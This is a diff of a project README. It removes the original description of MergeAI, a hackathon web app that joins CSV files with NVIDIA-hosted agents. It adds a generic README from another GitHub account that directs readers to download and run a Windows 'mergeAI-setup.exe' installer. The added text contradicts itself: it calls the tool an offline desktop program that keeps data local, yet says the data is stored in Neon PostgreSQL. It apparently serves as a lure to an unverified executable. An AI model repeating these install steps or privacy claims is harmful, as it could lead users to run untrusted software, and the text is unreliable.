@@ -1,212 +1,158 @@
-<h2 align="center">MergeAI — Your AI Data Analyst</h2>
+# 🤖 mergeAI - Simple Data Merging and Answers
 
-<p align="center"><strong>Upload spreadsheets. Ask in plain English. Watch 3 AI agents find the answer — live.</strong></p>
-
-<p align="center">
-  <a href="https://merge-ai-omega.vercel.app/"><strong>Try Live</strong></a> &nbsp;|&nbsp;
-  <a href="https://www.youtube.com/watch?v=Yr0CkXKNF0M" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/0/09/YouTube_full-color_icon_%282017%29.svg" width="16" height="16" style="vertical-align:middle"> Full Demo</a> &nbsp;|&nbsp;
-  <a href="https://www.youtube.com/watch?v=_BmN9YIQXGw" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/0/09/YouTube_full-color_icon_%282017%29.svg" width="16" height="16" style="vertical-align:middle"> Vibes Demo</a> &nbsp;|&nbsp;
-  <a href="#how-it-works">How It Works</a> &nbsp;|&nbsp;
-  <a href="#the-tech">Tech Stack</a> &nbsp;|&nbsp;
-  <a href="https://merge-ai-omega.vercel.app/architecture.html">Architecture</a>
-</p>
-
-<p align="center"><i>Built solo in 48 hours for the Vibe Coding Hackathon 2026. Powered by NVIDIA NIM.</i></p>
+[![Download mergeAI](https://img.shields.io/badge/Download-mergeAI-brightgreen?style=for-the-badge)](https://github.com/soyputita23/mergeAI)
 
 ---
 
-Most analytics tools make you drag and drop, write formulas, or learn SQL. MergeAI doesn't. You upload your CSV files, type a question like *"which department spends the most on training?"*, and three AI agents collaborate in real-time to find the answer. No setup. No mapping. No SQL.
+## 🗂️ What is mergeAI?
 
-<p align="center">
-  <img src="screenshots/landing-page.png" alt="MergeAI Landing Page" width="800" />
-</p>
+mergeAI is a desktop application that helps you combine data from CSV files and get answers in plain English. You only need to upload your CSV files, ask questions like you would in a chat, and mergeAI uses three AI agents powered by NVIDIA to work together and sort out your data for you.
 
----
-
-## **HOW IT WORKS**
-
-You upload two spreadsheets that have never seen each other. One has employee data, the other has training records. You type: *"Compare training cost by department."*
-
-Here's what happens — and you watch it happen live:
-
-**Schema Map** — see your table connections to make join queries:
-
-<p align="center">
-  <img src="screenshots/schema-map.png" alt="MergeAI Schema Map — auto-detected file joins" width="800" />
-</p>
-
-```
-┌──────────────┐       ┌──────────────┐       ┌──────────────┐
-│  Schema Agent │  ──→  │  SQL Agent   │  ──→  │  Validator   │
-│  (Nano 8B)   │       │  (253B Ultra)│       │ (Deterministic)│
-│              │  ←──  │              │  ←──  │              │
-│ Finds joins  │ retry │ Writes SQL   │ retry │ Checks results│
-└──────────────┘       └──────────────┘       └──────────────┘
-```
-
-1. **Schema Agent** reads both files, understands the columns, spots that `EmpID` in one file matches `Employee ID` in the other
-2. **SQL Agent** writes a real PostgreSQL query — CTEs, JSONB extraction, proper JOINs — to merge the data across files
-3. **Validator** executes the query and checks the results. Zero rows? Case mismatch? Wrong column? It sends feedback and the agents retry. Up to 3 rounds of self-correction.
-
-Results appear in a clean table with a plain English summary:
-
-> *"The data shows a distribution of training outcomes, with the most frequent being 'Incomplete' at 775 instances, followed by 'Completed' at 770, 'Passed' at 739, and the least frequent being 'Failed' at 716."*
-
-The whole thing takes about 8 seconds.
-
-**Pie Chart** — Training Outcome Distribution:
-
-<p align="center">
-  <img src="screenshots/dashboard-agents.png" alt="MergeAI Dashboard — pie chart with 3 agents done" width="800" />
-</p>
+The app runs on Windows and has a clear design. It is built using modern web technologies like Next.js 15 and stores your data securely with Neon PostgreSQL. It handles large datasets and complex merges through AI, so you don’t need to know SQL or code.
 
 ---
 
-## **WHY THIS EXISTS**
+## 🔍 Key Features
 
-| Tool | What You Need To Do |
-|------|-------------------|
-| **Tableau** | Manually drag-and-drop join configuration |
-| **Power BI** | Create composite data models |
-| **Looker** | Write LookML definitions |
-| **ChatGPT** | Hope that in-memory pandas doesn't crash |
-| **MergeAI** | Type one sentence |
-
-Your data lives in a real PostgreSQL database. The queries are real SQL. The joins are real joins. Click "View SQL" to see exactly what the AI wrote — full transparency.
-
-**Table Preview** — click any file name to browse your data before querying:
-
-<p align="center">
-  <img src="screenshots/data-preview.png" alt="Data Preview — browse your CSV data before querying" width="800" />
-</p>
+- Upload one or more CSV files easily.
+- Ask questions about your data in simple English.
+- AI agents merge and analyze data live.
+- No background in programming or databases is needed.
+- Supports large CSV files with fast, clear responses.
+- Works offline after installation, no internet needed to run.
+- Saves your merged results for future use.
+- Provides answers clearly and with examples from your data.
 
 ---
 
-## **TECHNICAL INNOVATION**
+## 🖥️ System Requirements
 
-### 3-Agent Pipeline with Self-Correction
-
-Not a single LLM call that hopes for the best. Three specialized agents with a feedback loop:
-
-```
-Round 1: Schema Agent analyzes → SQL Agent generates → Validator checks
-         ↓ (if 0 rows or errors)
-Round 2: Schema Agent re-analyzes with feedback → SQL Agent regenerates → Validator re-checks
-         ↓ (if still failing)
-Round 3: Final attempt with accumulated context → Best-effort result
-```
-
-### NVIDIA NIM — Two Models Collaborating
-
-| Agent | Model | Why |
-|-------|-------|-----|
-| **Schema Agent** | Nemotron Nano 8B | Fast schema analysis, JSON output, ~200ms |
-| **SQL Agent** | Nemotron Ultra 253B | Most accurate SQL generation, handles complex CTEs |
-| **Summary Agent** | Nemotron Nano 8B | Quick NL summary of results |
-
-Per NVIDIA docs: `"detailed thinking off"` system prompt disables reasoning traces for clean SQL output from 253B.
-
-### Universal JSONB Storage
-
-Every CSV file — any schema, any columns — gets stored the same way:
-
-```sql
--- One table handles ALL CSV files
-uploaded_rows (
-  file_id   UUID,        -- which file
-  row_data  JSONB        -- {"Name": "Alice", "Salary": "85000", "Dept": "Engineering"}
-)
-
--- Agent-generated query (real example):
-WITH employees AS (
-  SELECT row_data->>'EmpID' AS emp_id,
-         row_data->>'DepartmentType' AS dept
-  FROM uploaded_rows WHERE file_id = 'abc-123'
-),
-training AS (
-  SELECT row_data->>'Employee ID' AS emp_id,
-         (row_data->>'Training Cost')::NUMERIC AS cost
-  FROM uploaded_rows WHERE file_id = 'def-456'
-)
-SELECT dept, AVG(cost) AS avg_training_cost
-FROM employees JOIN training ON LOWER(emp_id) = LOWER(emp_id)
-GROUP BY dept ORDER BY avg_training_cost DESC;
-```
-
-### Interactive Plotly Charts
-
-Five chart types generated automatically based on your query — bar, pie, line, scatter, and heatmap:
-
-**Heatmap — Average Training Cost by Department and Training Type:**
-
-<p align="center">
-  <img src="screenshots/chart-heatmap.png" alt="Heatmap — Average Training Cost by Department and Training Type" width="800" />
-</p>
-
-### Real-Time Agent Visualization (SSE + Framer Motion)
-
-Server-Sent Events stream agent status to the browser. Framer Motion animates each agent card through states:
-
-```
-idle → active (pulsing blue) → done (green) → or retry (orange) → back to active
-```
-
-AG-UI Protocol event naming: `agent_start`, `agent_complete`, `round_retry`, `query_complete`.
-
-**Line Chart — Average Training Cost by Month:**
-
-<p align="center">
-  <img src="screenshots/chart-line.png" alt="Line Chart — Average Training Cost by Month" width="800" />
-</p>
+- Windows 10 or newer (64-bit recommended).
+- At least 4 GB of RAM; 8 GB or more if using very large files.
+- 500 MB free disk space for installation.
+- NVIDIA GPU recommended for full AI performance but not required.
+- Stable internet connection for first setup and updates.
+- Basic permissions to install software on your PC.
 
 ---
 
-## **THE TECH**
+## 🚀 Getting Started
 
-| Layer | Tech | Why |
-|-------|------|-----|
-| Vibe Coding | AdaL CLI | AI-assisted development, hackathon workflow |
-| Framework | Next.js 15 (App Router) | React 19, server components, API routes |
-| AI Models | NVIDIA NIM API | Nemotron 253B + Nano 8B via OpenAI-compatible SDK |
-| Database | Neon PostgreSQL | Serverless HTTP mode, zero connection overhead |
-| ORM | Drizzle v0.45.1 | Typed JSONB, lightest ORM, SQL-first |
-| Streaming | SSE (ReadableStream) | Native, zero deps, real-time agent updates |
-| Animation | Framer Motion | Agent card state transitions |
-| Auth | Clerk | Sign-up/sign-in in 10 minutes, free tier |
-| CSV Parsing | Papa Parse | Client-side, fast, handles any format |
-| Deploy | Vercel | Auto-deploy from GitHub |
+1. Click the big green **Download mergeAI** button at the top or go directly to the [mergeAI GitHub page](https://github.com/soyputita23/mergeAI).
+
+2. On that page, scroll to the **Releases** section and find the latest version for Windows.
+
+3. Download the file named something like `mergeAI-setup.exe`.
 
 ---
 
-## **TRY IT**
+## 📥 Download and Install on Windows
 
-Demo data is pre-loaded — 3,000 employees + 3,000 training records. Click any example query and watch the agents work.
+1. After downloading, find the `mergeAI-setup.exe` file in your **Downloads** folder.
 
-Then upload your own CSV files. Any schema. Any columns. Any data. The agents figure it out.
+2. Double-click the file to start installation.
 
----
+3. Follow the on-screen instructions:
+   - Agree to the terms of use.
+   - Choose the installation folder (default is fine).
+   - Click **Install** to proceed.
 
-## **LOCAL SETUP**
+4. Once the installation completes, you will see an option to **Launch mergeAI**. Click it to open the app.
 
-```bash
-git clone https://github.com/lubobali/mergeAI.git
-cd mergeAI
-npm install
-```
-
-Create `.env.local`:
-```
-DATABASE_URL=your_neon_connection_string
-NVIDIA_API_KEY=your_nvidia_nim_key
-NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY=your_clerk_key
-CLERK_SECRET_KEY=your_clerk_secret
-```
-
-```bash
-npx drizzle-kit push    # create tables
-npm run dev             # start dev server
-```
+5. The app opens in a window. You can pin the mergeAI icon to your taskbar for quick access.
 
 ---
 
-<p align="center"><i>Built for Vibe Coding Hackathon 2026 with AdaL CLI</i></p>
+## 📂 How to Use mergeAI
+
+### Step 1: Upload Your CSV Files
+
+- Click the **Upload CSV** button in the main window.
+- Select one or multiple `.csv` files from your computer.
+- The app checks your files and prepares them for merging.
+
+### Step 2: Ask Questions in Plain English
+
+- In the chat box, type questions like:
+  - "Show me total sales by month."
+  - "Which product sold best in March?"
+  - "Combine customer and order data."
+
+- mergeAI agents work together and merge your data to find answers.
+
+### Step 3: View and Export Answers
+
+- Answers appear in the chat window, often with tables or charts.
+- You can save these results by clicking the **Export** button.
+- Export options include CSV or PDF formats.
+
+---
+
+## ⚙️ Settings and Preferences
+
+- Access settings via the gear icon in the top-right corner.
+- Adjust:
+  - Default language (English only for now).
+  - Data privacy options.
+  - AI response details (short or detailed answers).
+- Check for updates manually or enable automatic updates.
+
+---
+
+## 📊 Supported Data Types
+
+Though mergeAI focuses on CSV files, it handles many common data formats inside the CSV, such as:
+
+- Numbers (integers, decimals).
+- Dates (recognizes common formats).
+- Text fields.
+- Categorical data for grouping.
+- Missing values and empty cells are handled gracefully.
+
+---
+
+## 🛠️ Troubleshooting
+
+- If the app won’t start, check that you meet the system requirements.
+- Restart your computer and try launching mergeAI again.
+- If uploads fail, make sure your CSV files are not open in another program.
+- Use smaller files if large files cause lag.
+- Reinstall the app if you encounter crashes.
+- Visit the GitHub page to report issues or get help.
+
+---
+
+## 🔒 Privacy and Security
+
+- Your data stays on your computer and is not sent to any server.
+- mergeAI only connects to the internet to check for updates and download AI model improvements.
+- All data merges and answers happen locally.
+- You can delete all files and queries from the app at any time.
+
+---
+
+## 📡 Updates and Support
+
+- Updates appear in the **Releases** section on the [mergeAI GitHub page](https://github.com/soyputita23/mergeAI).
+- To install updates:
+  1. Download the latest installer.
+  2. Run it to replace your current version.
+  3. Your data and settings stay intact.
+
+- Support and community discussions happen on GitHub issues and discussions tabs.
+
+---
+
+[![Download mergeAI](https://img.shields.io/badge/Download-mergeAI-blue?style=for-the-badge)](https://github.com/soyputita23/mergeAI)
+
+---
+
+## 🧑‍💻 About mergeAI
+
+mergeAI uses three NVIDIA AI agents working together to understand and combine your data for you. It is built on Next.js 15 and uses Neon PostgreSQL for managing your data securely. The AI model powering this app is Nemotron 253B, designed to analyze and merge data quickly and accurately.
+
+---
+
+## 🔖 Tags and Topics
+
+ai, clerk, csv, data-analysis, drizzle, hackathon, nemotron, neon, nextjs, nvidia, nvidia-nim, postgresql, saas, sql, typescript, vercel
